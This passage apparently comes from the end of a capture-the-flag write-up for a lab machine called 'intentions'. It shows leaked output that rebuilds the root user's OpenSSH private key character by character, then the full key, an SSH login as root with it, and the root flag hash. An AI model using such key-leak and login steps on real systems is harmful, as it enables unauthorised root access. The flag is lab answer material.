-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----E
-----BEGIN OPENSSH PRIVATE KEY-----Eb
-----BEGIN OPENSSH PRIVATE KEY-----Ebm
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9u
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZ
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQ
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAAB
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAAB
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABl
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlw
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAA
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAAd
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAAdz
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAAdzc
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAAdzc2
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAAdzc2g
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAAdzc2gt
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAAdzc2gtc
-----BEGIN OPENSSH PRIVATE KEY-----Ebm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5E
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5En
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5Enq
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8Q
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QO
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7g
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2l
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lT
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTH
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHw
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwl
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7F
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FM
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw9
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw95
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw95/
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw95/w
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw95/wy
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8J
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-----BEGIN OPENSSH PRIVATE KEY-----i5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW3
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95/wy8JW3
<--- SNIP --->
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```c
$ cat root_id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY----
```

```c
$ chmod 600 root_id_rsa
```

```c
$ ssh -i root_id_rsa root@10.129.148.165                                                                                       
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul  2 04:25:33 PM UTC 2023

  System load:           0.0166015625
  Usage of /:            64.7% of 6.30GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             225
  Users logged in:       1
  IPv4 address for eth0: 10.129.148.165
  IPv6 address for eth0: dead:beef::250:56ff:fe96:ed36


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

12 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@intentions:~#
```

## root.txt

```c
root@intentions:~# cat root.txt
d907f94fe211ed7bc2e77a713978a3a6
```
